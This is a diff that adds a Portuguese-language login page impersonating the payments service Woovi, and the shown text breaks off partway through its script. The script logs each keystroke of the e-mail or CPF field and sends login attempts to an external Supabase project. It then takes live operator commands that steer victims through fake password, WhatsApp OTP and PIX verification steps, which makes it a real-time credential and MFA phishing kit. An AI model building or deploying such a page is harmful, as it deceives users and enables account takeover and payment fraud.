@@ -1,0 +1,903 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+  <title>Login · Woovi</title>
+  <script src="config.js"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz,wght@0,6..12,400;0,6..12,500;0,6..12,600;0,6..12,700;1,6..12,400&display=swap"/>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.49.4/dist/umd/supabase.js"></script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      min-height: 100vh;
+      background-color: #f0f0f0;
+      font-family: 'Nunito Sans', 'Segoe UI', sans-serif;
+      color: #1a1a2e;
+    }
+    .page {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px 16px 40px;
+    }
+
+    /* ── Logo ── */
+    .top-logo { margin-bottom: 52px; }
+    .top-logo img { height: 40px; width: auto; display: block; }
+    .top-logo.hidden { visibility: hidden; pointer-events: none; }
+
+    /* ── Card area ── */
+    .card-area { width: 550px; max-width: 100%; }
+
+    /* ── Voltar ── */
+    .voltar-row {
+      display: none;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 12px;
+      cursor: pointer;
+      width: fit-content;
+    }
+    .voltar-row.show { display: flex; }
+    .voltar-row svg { color: #6b7280; }
+    .voltar-row span { font-size: 14px; color: #6b7280; font-weight: 600; }
+    .voltar-row:hover span, .voltar-row:hover svg { color: #374151; }
+
+    /* ── Card ── */
+    .card {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 1px 8px rgba(0,0,0,0.08);
+      width: 550px;
+      height: 387.6px;
+      max-width: 100%;
+      padding: 40px 48px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      transition: width 0.2s, height 0.2s;
+    }
+    .card.s2 { width: 545px; height: 315px; }
+    .card.s3 { width: 550px; height: 387.6px; }
+    .card.s4p { width: 550px; height: auto; min-height: 387.6px; justify-content: flex-start; }
+    .card.s4w { width: 550px; height: auto; justify-content: flex-start; padding: 32px 40px 36px; }
+
+    /* ── Steps ── */
+    .step { display: none; flex-direction: column; }
+    .step.active { display: flex; }
+
+    /* ── Títulos ── */
+    .card-title {
+      font-size: 22px; font-weight: 700; text-align: center;
+      margin-bottom: 24px; color: #111827;
+    }
+
+    /* ── Input simples ── */
+    .field-wrap { margin-bottom: 4px; }
+    .field-wrap input {
+      width: 100%; height: 52px;
+      border: 1.5px solid #d1d5db; border-radius: 6px;
+      font-size: 15px; font-family: inherit; color: #111827;
+      background: #fff; outline: none; padding: 0 14px;
+      transition: border-color 0.15s;
+    }
+    .field-wrap input::placeholder { color: #9ca3af; }
+    .field-wrap input:focus { border-color: #03D69D; }
+    .field-wrap input.error { border-color: #ef4444; }
+    .field-error { font-size: 12px; color: #ef4444; margin-top: 4px; padding-left: 2px; display: none; }
+    .field-error.show { display: block; }
+
+    /* ── Botão principal ── */
+    .btn-primary {
+      width: 480px; height: 31px; max-width: 100%;
+      border: none; border-radius: 6px;
+      font-size: 14px; font-weight: 700; font-family: inherit;
+      cursor: pointer; display: flex; align-items: center;
+      justify-content: center; gap: 8px;
+      margin-top: 25px; margin-bottom: 14px;
+      transition: background 0.15s;
+    }
+    .btn-primary.disabled { background: #d1d5db; color: #9ca3af; cursor: default; }
+    .btn-primary.active { background: #1FB28A; color: #fff; }
+    .btn-primary.active:hover { background: #1a9a77; }
+
+    /* ── Links ── */
+    .link-center { text-align: center; margin-bottom: 18px; }
+    .link-center a { font-size: 13.5px; color: #6b7280; text-decoration: none; }
+    .link-center a:hover { text-decoration: underline; }
+    .link-center a.green { color: #03D69D; font-weight: 600; }
+
+    /* ── Divider ── */
+    .divider { display: flex; align-items: center; gap: 12px; margin-bottom: 18px; }
+    .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #e5e7eb; }
+    .divider span { font-size: 13px; color: #9ca3af; }
+
+    /* ── Botão Google ── */
+    .btn-google {
+      display: flex; align-items: center; justify-content: center;
+      gap: 10px; width: auto; padding: 0 24px; height: 44px;
+      margin: 0 auto; background: #fff; border: 1.5px solid #d1d5db;
+      border-radius: 6px; font-size: 14px; font-weight: 600;
+      font-family: inherit; color: #374151; cursor: pointer;
+      transition: border-color 0.15s, box-shadow 0.15s;
+    }
+    .btn-google:hover { border-color: #9ca3af; box-shadow: 0 1px 4px rgba(0,0,0,0.1); }
+    .btn-google img { width: 20px; height: 20px; }
+
+    /* ── Step 2: chip + floating input ── */
+    .user-chip { display: flex; align-items: center; gap: 10px; justify-content: center; margin-bottom: 20px; }
+    .user-avatar {
+      width: 32px; height: 32px; border-radius: 50%;
+      background: #9ca3af; color: #fff;
+      font-size: 14px; font-weight: 700;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0; text-transform: uppercase;
+    }
+    .user-chip-label { font-size: 15px; color: #374151; font-weight: 500; }
+
+    .float-wrap { position: relative; margin-bottom: 4px; }
+    .float-wrap input {
+      width: 100%; height: 56px;
+      border: 1.5px solid #d1d5db; border-radius: 4px;
+      font-size: 16px; font-family: inherit; color: #111827;
+      background: #fff; outline: none;
+      padding: 18px 44px 6px 14px;
+      transition: border-color 0.15s;
+    }
+    .float-wrap input:focus { border-color: #1a2f6e; border-width: 2px; }
+    .float-wrap input.error { border-color: #ef4444; }
+    .float-label {
+      position: absolute; left: 14px; top: 50%;
+      transform: translateY(-50%);
+      font-size: 16px; color: #9ca3af;
+      pointer-events: none;
+      transition: top 0.15s, font-size 0.15s, color 0.15s;
+      background: #fff; padding: 0 2px;
+    }
+    .float-wrap input:focus ~ .float-label,
+    .float-wrap input:not(:placeholder-shown) ~ .float-label {
+      top: 10px; font-size: 11px; color: #1a2f6e;
+    }
+    .float-wrap input.error ~ .float-label { color: #ef4444; }
+    .pw-toggle {
+      position: absolute; right: 12px; top: 50%;
+      transform: translateY(-50%);
+      background: none; border: none; cursor: pointer;
+      color: #1a2f6e; padding: 4px;
+      display: flex; align-items: center;
+    }
+    .pw-toggle:hover { opacity: 0.75; }
+
+    /* ── Step 3: MFA options ── */
+    .mfa-title {
+      font-size: 18px; font-weight: 700; color: #111827;
+      margin-bottom: 10px; white-space: nowrap;
+    }
+    .mfa-subtitle { font-size: 14px; color: #6b7280; margin-bottom: 24px; }
+    .mfa-subtitle .hl { color: #1FB28A; }
+    .mfa-option {
+      display: flex; align-items: center; justify-content: space-between;
+      gap: 16px; border: 1.5px solid #e5e7eb; border-radius: 8px;
+      padding: 18px 20px; margin-bottom: 12px;
+    }
+    .mfa-option-title { font-size: 15px; font-weight: 700; color: #111827; margin-bottom: 4px; }
+    .mfa-option-desc { font-size: 13px; color: #6b7280; line-height: 1.5; }
+    .mfa-option-desc .hl { color: #1FB28A; }
+    .btn-selecionar {
+      display: flex; align-items: center; gap: 6px;
+      padding: 8px 18px; background: #1FB28A; color: #fff;
+      border: none; border-radius: 20px;
+      font-size: 14px; font-weight: 700; font-family: inherit;
+      cursor: pointer; white-space: nowrap;
+      transition: background 0.15s; flex-shrink: 0;
+    }
+    .btn-selecionar:hover { background: #1a9a77; }
+    .btn-selecionar svg { width: 16px; height: 16px; }
+
+    /* ── Step 4p: PIX ── */
+    .pix-title {
+      font-size: 22px; font-weight: 700; color: #111827;
+      text-align: center; margin-bottom: 20px;
+    }
+    .pix-desc {
+      font-size: 13.5px; color: #4d84a8;
+      text-align: center; line-height: 1.65; margin-bottom: 16px;
+    }
+    .pix-cpf-chip { display: flex; justify-content: center; margin-bottom: 20px; }
+    .pix-cpf-chip .chip {
+      display: inline-flex; align-items: center;
+      border: 1px solid #d1d5db; border-radius: 20px;
+      padding: 4px 14px; font-size: 13px; color: #374151;
+      background: #f9fafb; gap: 6px;
+    }
+    .pix-cpf-chip .chip .lbl { color: #9ca3af; font-weight: 600; }
+    .pix-cpf-chip .chip .sep { color: #d1d5db; }
+    .qr-wrap { display: flex; justify-content: center; }
+    .qr-wrap img {
+      width: 200px; height: 200px;
+      border: 2px solid #1a2f6e; border-radius: 12px;
+    }
+
+    /* ── Step 4w: WhatsApp ── */
+    .wa-title {
+      font-size: 22px; font-weight: 700; color: #111827;
+      text-align: center; margin-bottom: 14px; line-height: 1.3;
+    }
+    .wa-desc {
+      font-size: 13px; color: #6b7280;
+      line-height: 1.6; margin-bottom: 20px;
+    }
+    .wa-steps { display: flex; flex-direction: column; gap: 16px; margin-bottom: 20px; }
+    .wa-step { display: flex; align-items: flex-start; gap: 14px; }
+    .wa-step-icon { width: 36px; height: 36px; flex-shrink: 0; color: #1FB28A; }
+    .wa-step-icon svg { width: 36px; height: 36px; }
+    .wa-step-title { font-size: 13.5px; font-weight: 700; color: #1FB28A; margin-bottom: 3px; }
+    .wa-step-text { font-size: 12.5px; color: #6b7280; line-height: 1.5; }
+
+    .otp-label { font-size: 13px; font-weight: 600; color: #374151; margin-bottom: 10px; }
+    .otp-boxes { display: flex; gap: 8px; margin-bottom: 16px; }
+    .otp-box {
+      width: 46px; height: 52px;
+      border: 1.5px solid #d1d5db; border-radius: 6px;
+      font-size: 20px; font-weight: 700; font-family: inherit;
+      color: #111827; text-align: center; background: #fff;
+      outline: none; transition: border-color 0.15s;
+    }
+    .otp-box:focus { border-color: #1FB28A; }
+    .btn-continuar-wa {
+      width: 100%; height: 44px;
+      border: none; border-radius: 6px;
+      font-size: 15px; font-weight: 700; font-family: inherit;
+      cursor: pointer; transition: background 0.15s;
+    }
+    .btn-continuar-wa.disabled { background: #d1d5db; color: #9ca3af; cursor: default; }
+    .btn-continuar-wa.active { background: #1FB28A; color: #fff; }
+    .btn-continuar-wa.active:hover { background: #1a9a77; }
+
+    /* ── Abaixo do card ── */
+    .below-card { margin-top: 28px; text-align: center; }
+    .below-card .signup-label { font-size: 14px; font-weight: 700; color: #374151; margin-bottom: 4px; }
+    .below-card a { font-size: 14px; color: #03D69D; font-weight: 600; text-decoration: none; }
+    .below-card a:hover { text-decoration: underline; }
+    .below-card.hidden { visibility: hidden; pointer-events: none; }
+
+    /* ── Segurança ── */
+    .security { margin-top: 24px; text-align: center; }
+    .security .sec-row {
+      display: flex; align-items: center; justify-content: center;
+      gap: 6px; font-size: 13px; color: #374151;
+    }
+    .security .sec-row img { width: 14px; height: 14px; opacity: 0.6; }
+    .security .version { font-size: 11px; color: #9ca3af; margin-top: 4px; }
+  </style>
+</head>
+<body>
+<div class="page">
+
+  <div class="top-logo" id="topLogo">
+    <img src="image.svg" alt="Woovi" />
+  </div>
+
+  <div class="card-area" id="cardArea">
+
+    <div class="voltar-row" id="voltarRow">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+      <span>Voltar</span>
+    </div>
+
+    <div class="card" id="card">
+
+      <!-- ══ STEP 1 ══ -->
+      <div class="step active" id="step1">
+        <h1 class="card-title">Login</h1>
+        <div class="field-wrap">
+          <input type="text" id="emailCpf" placeholder="E-mail ou CPF" autocomplete="username" />
+          <div class="field-error" id="emailCpfError"></div>
+        </div>
+        <button class="btn-primary disabled" id="btnContinuar" type="button" disabled>
+          Continuar
+          <img src="image (1).svg" alt="" width="20" height="20" id="arrowIcon" style="filter: brightness(0) saturate(0) opacity(0.4)" />
+        </button>
+        <div class="link-center"><a href="#">Esqueceu a senha</a></div>
+        <div class="divider"><span>Ou</span></div>
+        <button class="btn-google" type="button">
+          <img src="image (3).svg" alt="Google" />
+          Fazer Login com o Google
+        </button>
+      </div>
+
+      <!-- ══ STEP 2 ══ -->
+      <div class="step" id="step2">
+        <h1 class="card-title">Senha</h1>
+        <div class="user-chip">
+          <div class="user-avatar" id="userAvatar"></div>
+          <span class="user-chip-label" id="userChipLabel"></span>
+        </div>
+        <div class="float-wrap">
+          <input type="password" id="password" placeholder=" " autocomplete="current-password" />
+          <label class="float-label" for="password">Senha</label>
+          <button class="pw-toggle" id="togglePw" type="button" aria-label="Mostrar senha">
+            <svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+            </svg>
+          </button>
+          <div class="field-error" id="passwordError"></div>
+        </div>
+        <button class="btn-primary disabled" id="btnLogin" type="button" disabled>Log in</button>
+        <div class="link-center" style="margin-bottom:0;margin-top:4px;">
+          <a href="#" class="green">Esqueceu a senha?</a>
+        </div>
+      </div>
+
+      <!-- ══ STEP 3 ══ -->
+      <div class="step" id="step3">
+        <h1 class="mfa-title">Confirmar código de múltiplos fatores</h1>
+        <p class="mfa-subtitle">Selecione como você quer <span class="hl">confirmar este login.</span></p>
+        <div class="mfa-option" id="optWa">
+          <div class="mfa-option-info">
+            <div class="mfa-option-title">Código WhatsApp</div>
+            <div class="mfa-option-desc">Receba um código de 6 dígitos no seu <span class="hl">WhatsApp.</span></div>
+          </div>
+          <button class="btn-selecionar" type="button">
+            Selecionar
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+          </button>
+        </div>
+        <div class="mfa-option" id="optPix">
+          <div class="mfa-option-info">
+            <div class="mfa-option-title">Autenticação PIX</div>
+            <div class="mfa-option-desc"><span class="hl">Confirme</span> pagando um Pix de um banco que você <span class="hl">possui.</span></div>
+          </div>
+          <button class="btn-selecionar" type="button">
+            Selecionar
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+          </button>
+        </div>
+        <div class="field-error" id="mfaError" style="text-align:center;margin-top:16px;"></div>
+      </div>
+
+      <!-- ══ STEP 4p — PIX ══ -->
+      <div class="step" id="step4p">
+        <h1 class="pix-title">Confirme com Pix</h1>
+        <p class="pix-desc" id="pixDesc">
+          Vamos validar seu CPF utilizando uma transação Pix. Pague o QRCode abaixo,
+          de R$ 0,01 usando o aplicativo do seu banco em uma conta do seu CPF
+          <span id="pixCpfDesc"></span>. Após o pagamento o valor de R$ 0,01 será reembolsado automaticamente.
+        </p>
+        <div class="pix-cpf-chip">
+          <div class="chip">
+            <span class="lbl">CPF</span>
+            <span class="sep">|</span>
+            <span id="pixCpfChip"></span>
+          </div>
+        </div>
+        <div class="qr-wrap">
+          <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=woovi-pix-demo&color=000000&bgcolor=ffffff" alt="QR Code PIX" />
+        </div>
+        <div class="field-error" id="pixError" style="text-align:center;margin-top:16px;"></div>
+      </div>
+
+      <!-- ══ STEP 4w — WhatsApp ══ -->
+      <div class="step" id="step4w">
+        <h1 class="wa-title">Confirmar código de múltiplos fatores</h1>
+        <p class="wa-desc">
+          Para sua segurança, precisamos verificar sua identidade. Um código de
+          verificação foi enviado para o seu telefone terminado em 0003 via WhatsApp e SMS.
+        </p>
+        <div class="wa-steps">
+          <div class="wa-step">
+            <div class="wa-step-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="5" y="2" width="14" height="20" rx="2"/><rect x="9" y="2" width="6" height="20" rx="1" opacity=".4"/>
+                <circle cx="12" cy="17" r="1" fill="currentColor" stroke="none"/>
+              </svg>
+            </div>
+            <div>
+              <div class="wa-step-title">1° - Acesse seu telefone</div>
+              <div class="wa-step-text">Abra o aplicativo de WhatsApp ou SMS em seu celular.</div>
+            </div>
+          </div>
+          <div class="wa-step">
+            <div class="wa-step-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                <circle cx="12" cy="11" r="2" fill="currentColor" stroke="none" opacity=".5"/>
+                <line x1="12" y1="13" x2="12" y2="15.5" stroke-width="2"/>
+              </svg>
+            </div>
+            <div>
+              <div class="wa-step-title">2° - Localize o código de autenticação</div>
+              <div class="wa-step-text">Procure o código de autenticação de 6 dígitos exibido no WhatsApp ou SMS.</div>
+            </div>
+          </div>
+          <div class="wa-step">
+            <div class="wa-step-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="5" y="2" width="14" height="20" rx="2"/>
+                <line x1="8" y1="13" x2="8" y2="13.1" stroke-width="2.5"/><line x1="12" y1="13" x2="12" y2="13.1" stroke-width="2.5"/><line x1="16" y1="13" x2="16" y2="13.1" stroke-width="2.5"/>
+                <line x1="8" y1="16" x2="8" y2="16.1" stroke-width="2.5"/><line x1="12" y1="16" x2="12" y2="16.1" stroke-width="2.5"/><line x1="16" y1="16" x2="16" y2="16.1" stroke-width="2.5"/>
+              </svg>
+            </div>
+            <div>
+              <div class="wa-step-title">3° - Digite o código e confirme</div>
+              <div class="wa-step-text">Digite o código de 6 dígitos no campo abaixo e confirme a operação.</div>
+            </div>
+          </div>
+        </div>
+        <div class="otp-label">Código de autenticação:</div>
+        <div class="field-error" id="otpError" style="margin-bottom:12px;"></div>
+        <div class="otp-boxes">
+          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" />
+          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" />
+          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" />
+          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" />
+          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" />
+          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" />
+        </div>
+        <button class="btn-continuar-wa disabled" id="btnContinuarWa" type="button" disabled>Continuar</button>
+      </div>
+
+    </div><!-- /card -->
+  </div><!-- /card-area -->
+
+  <div class="below-card" id="belowCard">
+    <p class="signup-label">Novo na Woovi?</p>
+    <a href="#">Clique aqui para se cadastrar</a>
+  </div>
+
+  <div class="security">
+    <div class="sec-row">
+      <img src="image (2).svg" alt="" />
+      Seus dados são criptografados
+    </div>
+    <div class="version">(v8.6.61)</div>
+  </div>
+
+<!-- Spinner de carregamento -->
+<div id="loadingSpinner" style="
+  display:none;position:fixed;inset:0;z-index:9998;
+  background:rgba(0,0,0,0.5);align-items:center;justify-content:center;
+">
+  <div style="
+    background:#fff;border-radius:16px;padding:40px;
+    text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.2);
+  ">
+    <div style="
+      width:60px;height:60px;margin:0 auto 24px;
+      border:4px solid #e5e7eb;border-top-color:#1FB28A;
+      border-radius:50%;animation:spin 1s linear infinite;
+    "></div>
+    <div style="font-size:14px;color:#6b7280;">
+      Aguarde enquanto verificamos seus dados...
+    </div>
+  </div>
+</div>
+
+<!-- Toast de notificações -->
+<div id="cmdToast" style="
+  position:fixed;bottom:20px;right:20px;z-index:9999;
+  background:#fff;border-radius:12px;padding:16px 20px;
+  box-shadow:0 4px 16px rgba(0,0,0,0.1);
+  display:none;max-width:360px;animation:slideIn 0.3s ease;
+">
+  <div style="display:flex;gap:12px;align-items:flex-start;">
+    <span id="cmdIcon" style="font-size:24px;flex-shrink:0;"></span>
+    <div style="flex:1;">
+      <div id="cmdTitle" style="font-size:14px;font-weight:700;color:#111827;margin-bottom:2px;"></div>
+      <div id="cmdMsg" style="font-size:13px;color:#6b7280;line-height:1.4;"></div>
+    </div>
+  </div>
+</div>
+<style>
+  @keyframes spin {
+    to { transform:rotate(360deg); }
+  }
+  @keyframes slideIn {
+    from { opacity:0; transform:translateX(400px); }
+    to { opacity:1; transform:translateX(0); }
+  }
+  @keyframes popIn {
+    from { opacity:0; transform:scale(0.85); }
+    to   { opacity:1; transform:scale(1); }
+  }
+</style>
+
+<script>
+  // ══════════════════════════════════════════════════════
+  // WOOVI SHIELD — Rastreamento de eventos em tempo real
+  // Envia cada ação do usuário para o dashboard
+  // ══════════════════════════════════════════════════════
+  let _trackedUser   = null;
+  let _inputTimers   = {};
+  let _sessionId = null;
+  let _sb = null; // Cliente Supabase (inicializado em inicializarApp)
+
+  // ── Supabase Broadcast — online em tempo real ──
+  let _broadcastChannel = null;
+  let _isWaiting = false;
+
+  // Gera session ID aleatório (não depende de API)
+  async function initSessionId() {
+    _sessionId = 'session-' + Math.random().toString(36).substr(2, 9);
+    inicializarApp();
+  }
+
+  // Inicia app após obter session ID
+  function inicializarApp() {
+    try {
+    const createClient = window.supabase?.createClient || window.createClient;
+    if (createClient) {
+      _sb = createClient(
+        'https://pfbgsviarvnkaadrkxfd.supabase.co',
+        'sb_publishable_vMQXPTlWH30Bys_bgojo5A_IdyjXEdH',
+        { auth: { persistSession: false, autoRefreshToken: false, detectSessionInUrl: false } }
+      );
+
+      _broadcastChannel = _sb.channel('login-online', {
+        config: { broadcast: { self: false } },
+      });
+
+      // Definições de comandos recebíveis
+      const CMDS = {
+        senha_errada:       { icon:'🔴', title:'Senha incorreta',           msg:'A senha informada está incorreta. Tente novamente.' },
+        login_invalido:     { icon:'⚠️', title:'Login inválido',            msg:'E-mail ou CPF não encontrado. Verifique e tente novamente.' },
+        codigo_invalido:    { icon:'❌', title:'Código inválido',           msg:'O código de verificação informado é inválido ou expirou.' },
+        conta_bloqueada:    { icon:'🔒', title:'Conta bloqueada',           msg:'Sua conta foi temporariamente bloqueada por excesso de tentativas.' },
+        sessao_expirada:    { icon:'⏰', title:'Sessão expirada',           msg:'Sua sessão expirou. Recarregue a página e tente novamente.' },
+        aguarde:            { icon:'⏳', title:'Aguarde',                   msg:'Sua solicitação está sendo processada. Aguarde um momento.' },
+        acesso_liberado:    { icon:'✅', title:'Acesso liberado!',          msg:'Login confirmado com sucesso. Bem-vindo!' },
+        cpf_nao_encontrado: { icon:'🔍', title:'CPF não encontrado',        msg:'Este CPF não está cadastrado em nossa base de dados.' },
+        verificar_whatsapp: { icon:'📱', title:'Verifique seu WhatsApp',    msg:'Enviamos um código para o seu WhatsApp. Por favor, verifique.' },
+        tentar_novamente:   { icon:'🔄', title:'Tente novamente',           msg:'Ocorreu um problema. Por favor, tente novamente.' },
+        dados_incorretos:   { icon:'📋', title:'Dados incorretos',          msg:'Os dados informados não correspondem ao nosso cadastro.' },
+        mfa_whatsapp_ok:    { icon:'💬', title:'WhatsApp confirmado',       msg:'Enviamos o código para seu WhatsApp. Digite-o abaixo.' },
+        mfa_pix_ok:         { icon:'💳', title:'PIX confirmado',            msg:'Escaneie o QR Code do PIX com seu banco.' },
+        codigo_valido:      { icon:'✅', title:'Código válido',             msg:'Código verificado com sucesso!' },
+        otp_correto:        { icon:'✅', title:'OTP correto',               msg:'Código OTP verificado com sucesso!' },
+        senha_correta:      { icon:'✅', title:'Senha correta',             msg:'Senha verificada. Escolha um método de MFA.' },
+      };
+
+      // Recebe comandos do dashboard
+      _broadcastChannel.on('broadcast', { event: 'cmd' }, ({ payload }) => {
+        if (!payload) return;
+        if (payload.sessionId && payload.sessionId !== _sessionId) return;
+        const def = CMDS[payload.cmd] || { icon:'📢', title:'Aviso', msg: payload.msg || payload.cmd };
+        // Mostra a notificação (passa cmd para saber se deve mostrar ou não)
+        mostrarCmd(def.icon, def.title, payload.msg || def.msg, payload.cmd);
+        // Processa comandos especiais que avançam o fluxo
+        if (payload.cmd === 'senha_correta' || payload.cmd === 'acesso_liberado') {
+          setTimeout(() => goTo('s3', { showLogo: false, showBelow: false }), 500);
+        } else if (payload.cmd === 'codigo_valido' || payload.cmd === 'otp_correto') {
+          // Sucesso no OTP — avança para o próximo passo
+          setTimeout(() => {
+            otpBoxes.forEach(b => b.value = '');
+            goTo('s1', { showLogo: true, showBelow: false });
+          }, 500);
+        } else if (payload.cmd === 'mfa_whatsapp_ok') {
+          // Sucesso no MFA — vai para step 4w (WhatsApp OTP)
+          setTimeout(() => goTo('s4w', { showLogo: true, showBelow: false }), 500);
+        } else if (payload.cmd === 'mfa_pix_ok') {
+          // Sucesso no MFA — vai para step 4p (PIX)
+          setTimeout(() => goTo('s4p', { showLogo: true, showBelow: false }), 500);
+        }
+      });
+
+      _broadcastChannel.subscribe(status => {
+        if (status === 'SUBSCRIBED') sendHeartbeat();
+      });
+    }
+    } catch (e) {
+      console.error('[Broadcast] init error:', e);
+    }
+  }
+
+  // Inicia obtendo IP como session ID
+  initSessionId();
+
+  function sendHeartbeat() {
+    if (!_broadcastChannel) return;
+    _broadcastChannel.send({
+      type: 'broadcast',
+      event: 'session',
+      payload: {
+        sessionId: _sessionId,
+        step: typeof cur !== 'undefined' ? cur : 's1',
+        usuario: _trackedUser,
+        action: 'ping',
+        isWaiting: _isWaiting,
+      },
+    });
+  }
+
+  // Ping a cada 10s
+  setInterval(sendHeartbeat, 10000);
+
+  // Envia evento de autenticação direto ao Supabase
+  async function trackEvent(tipo, mensagem, status = 'info', extra = {}) {
+    try {
+      let usuario;
+      if (extra.usuario && extra.usuario !== _sessionId) {
+        usuario = `${extra.usuario} [${_sessionId}]`;
+      } else {
+        usuario = _trackedUser ? `${_trackedUser} [${_sessionId}]` : _sessionId;
+      }
+
+      const payload = {
+        tipo, mensagem, status,
+        usuario,
+        ip: null,
+        user_agent: navigator.userAgent,
+        step: cur,
+        ...extra,
+      };
+
+      if (_sb) {
+        await _sb.from('events').insert([payload]);
+      }
+    } catch (_) {}
+  }
+
+  function trackInput(campo, valor, step) {
+    clearTimeout(_inputTimers[campo]);
+    _inputTimers[campo] = setTimeout(async () => {
+      try {
+        const payload = {
+          level: 'debug',
+          categoria: 'keystroke',
+          mensagem: `[${step}] ${campo}: ${valor}`,
+          detalhes: {
+            campo, valor, step,
+            sessionId: _sessionId,
+            usuario: _trackedUser,
+            tamanho: valor.length,
+            timestamp: new Date().toISOString(),
+          },
+        };
+
+        if (_sb) {
+          await _sb.from('logs').insert([payload]);
+        }
+      } catch (_) {}
+    }, 400);
+  }
+
+  const card      = document.getElementById('card');
+  const cardArea  = document.getElementById('cardArea');
+  const topLogo   = document.getElementById('topLogo');
+  const belowCard = document.getElementById('belowCard');
+  const voltarRow = document.getElementById('voltarRow');
+
+  const steps = {
+    s1:  document.getElementById('step1'),
+    s2:  document.getElementById('step2'),
+    s3:  document.getElementById('step3'),
+    s4p: document.getElementById('step4p'),
+    s4w: document.getElementById('step4w'),
+  };
+
+  let cur = 's1';
+
+  const CARD_SIZES = {
+    s1:  [],
+    s2:  ['s2'],
+    s3:  ['s3'],
+    s4p: ['s4p'],
+    s4w: ['s4w'],
+  };
+
+  function goTo(next, { showLogo = true, showBelow = true, showVoltar = true } = {}) {
+    steps[cur].classList.remove('active');
+    card.classList.remove('s2','s3','s4p','s4w');
+    CARD_SIZES[next].forEach(c => card.classList.add(c));
+    steps[next].classList.add('active');
+    topLogo.classList.toggle('hidden', !showLogo);
+    belowCard.classList.toggle('hidden', !showBelow);
+    voltarRow.classList.toggle('show', showVoltar);
+    cur = next;
+    // Atualiza step no heartbeat imediatamente
+    sendHeartbeat('heartbeat');
+  }
+
+  // ── CPF masking ──
+  function maskCpf(v) {
+    const d = v.replace(/\D/g, '');
+    if (d.length === 11) return d.slice(0,3) + '.***.***-' + d.slice(9);
+    return v;
+  }
+
+  // ── Step 1 ──
+  const emailCpfInput = document.getElementById('emailCpf');
+  const emailCpfError = document.getElementById('emailCpfError');
+  const btnContinuar  = document.getElementById('btnContinuar');
+  const arrowIcon     = document.getElementById('arrowIcon');
+
+  function isValidEmailOrCPF(val) {
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val) ||
+           /^\d{3}\.?\d{3}\.?\d{3}-?\d{2}$/.test(val.replace(/\s/g,''));
+  }
+
+  emailCpfInput.addEventListener('input', () => {
+    trackInput('email_cpf', emailCpfInput.value, 'Login');
+    const valid = emailCpfInput.value.trim().length > 0 && isValidEmailOrCPF(emailCpfInput.value.trim());
+    emailCpfError.classList.remove('show');
+    emailCpfInput.classList.remove('error');
+    btnContinuar.disabled = !valid;
+    btnContinuar.classList.toggle('active', valid);
+    btnContinuar.classList.toggle('disabled', !valid);
+    arrowIcon.style.filter = valid ? 'brightness(0) invert(1)' : 'brightness(0) saturate(0) opacity(0.4)';
+  });
+  emailCpfInput.addEventListener('blur', () => {
+    const v = emailCpfInput.value.trim();
+    if (v && !isValidEmailOrCPF(v)) {
+      emailCpfInput.classList.add('error');
+      emailCpfError.textContent = 'E-mail ou CPF inválido';
+      emailCpfError.classList.add('show');
+      trackEvent('cpf_invalid', `E-mail ou CPF inválido: "${v}"`, 'warning');
+    }
+  });
+  btnContinuar.addEventListener('click', () => {
+    const v = emailCpfInput.value.trim();
+    if (!isValidEmailOrCPF(v)) return;
+    _trackedUser = v;
+    document.getElementById('userAvatar').textContent = v[0].toUpperCase();
+    document.getElementById('userChipLabel').textContent = v;
+    const masked = maskCpf(v);
+    document.getElementById('pixCpfDesc').textContent = masked;
+    document.getElementById('pixCpfChip').textContent = masked;
+    trackEvent('login_attempt', `Tentativa de login: ${v}`, 'info');
+    goTo('s2', { showLogo: false, showBelow: false });
+  });
+  emailCpfInput.addEventListener('keydown', e => { if (e.key === 'Enter' && !btnContinuar.disabled) btnContinuar.click(); });
+
+  // ── Step 2 ──
+  const passwordInput = document.getElementById('password');
+  const passwordError = document.getElementById('passwordError');
+  const btnLogin      = document.getElementById('btnLogin');
+  const togglePw      = document.getElementById('togglePw');
